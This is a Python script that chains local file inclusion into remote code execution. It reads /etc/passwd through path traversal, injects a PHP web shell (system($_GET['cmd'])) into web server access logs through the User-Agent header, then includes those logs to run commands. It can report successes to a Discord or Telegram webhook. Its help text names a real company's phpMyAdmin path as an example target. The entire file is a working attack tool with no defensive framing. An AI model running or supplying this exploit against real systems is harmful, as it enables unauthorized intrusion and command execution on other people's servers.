import requests
import urllib3
import argparse
import time
import json
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== CONFIG =====
TIMEOUT = 10
HEADERS = {"User-Agent": "Mozilla/5.0 (LFI-RCE-Pipeline)"}
WEBHOOK_URL = ""  # Optional: Discord/TG webhook for notifications
REPORT_PATH = "report.json"
# ==================

def notify(message):
    if not WEBHOOK_URL:
        print(f"[NOTIFY] {message}")
        return
    try:
        requests.post(WEBHOOK_URL, json={"content": message})
    except:
        print("[!] Notification failed.")

def send_log_poison(target):
    payload = "<?php system($_GET['cmd']); ?>"
    try:
        r = requests.get(target, headers={"User-Agent": payload}, verify=False, timeout=TIMEOUT)
        if r.status_code < 500:
            print("[+] Log poisoning payload sent.")
    except Exception as e:
        print(f"[!] Error sending log poison: {e}")

def test_lfi(target, param, file):
    payload = {param: file}
    try:
        r = requests.get(target, params=payload, headers=HEADERS, verify=False, timeout=TIMEOUT)
        if "root:x:0:0" in r.text:
            print("[+] LFI Confirmed! /etc/passwd leaked.")
            return True
        else:
            print("[-] LFI test failed or not vulnerable.")
            return False
    except Exception as e:
        print(f"[!] LFI test error: {e}")
        return False

def test_rce(target, param, log_path):
    payload = {param: log_path, "cmd": "id"}
    try:
        r = requests.get(target, params=payload, headers=HEADERS, verify=False, timeout=TIMEOUT)
        if "uid=" in r.text:
            print("[+] RCE confirmed via log poisoning!")
            print("[OUTPUT]", r.text[:200])
            return True, r.text[:200]
        else:
            print("[-] RCE test failed.")
            return False, r.text[:200]
    except Exception as e:
        print(f"[!] RCE test error: {e}")
        return False, ""

def save_report(data):
    try:
        with open(REPORT_PATH, "w") as f:
            json.dump(data, f, indent=4)
        print(f"[+] Report saved to {REPORT_PATH}")
    except Exception as e:
        print(f"[!] Failed to save report: {e}")

def main():
    parser = argparse.ArgumentParser(description="Automation Full Pipeline LFI -> RCE")
    parser.add_argument("--target", required=True, help="Full target URL (e.g., https://viettel.com.vn/phpmyadmin/grab_globals.lib.php)")
    parser.add_argument("--param", default="$__redirect", help="Parameter vulnerable to LFI")
    args = parser.parse_args()

    print(f"[*] Starting LFI -> RCE pipeline on {args.target}")
    
    result = {
        "target": args.target,
        "param": args.param,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "lfi": False,
        "rce": False,
        "output": ""
    }

    # Step 1: Test LFI
    lfi_success = test_lfi(args.target, args.param, "../../../../../../etc/passwd")
    result["lfi"] = lfi_success

    if not lfi_success:
        notify(f"[-] LFI test failed on {args.target}")
        save_report(result)
        sys.exit(0)

    notify(f"[+] LFI confirmed on {args.target}, proceeding to log poisoning.")

    # Step 2: Log Poison
    send_log_poison(args.target)
    time.sleep(5)  # wait for logs to flush

    # Step 3: Attempt RCE via poisoned log
    common_logs = [
        "../../../../../../var/log/nginx/access.log",
        "../../../../../../var/log/httpd/access_log",
        "../../../../../../var/log/apache2/access.log"
    ]
    
    for log_path in common_logs:
        rce_success, output = test_rce(args.target, args.param, log_path)
        if rce_success:
            result["rce"] = True
            result["output"] = output
            notify(f"[+] RCE achieved on {args.target} via {log_path}")
            break

    if not result["rce"]:
        notify(f"[-] RCE could not be achieved on {args.target}")

    save_report(result)

if __name__ == "__main__":
    main()
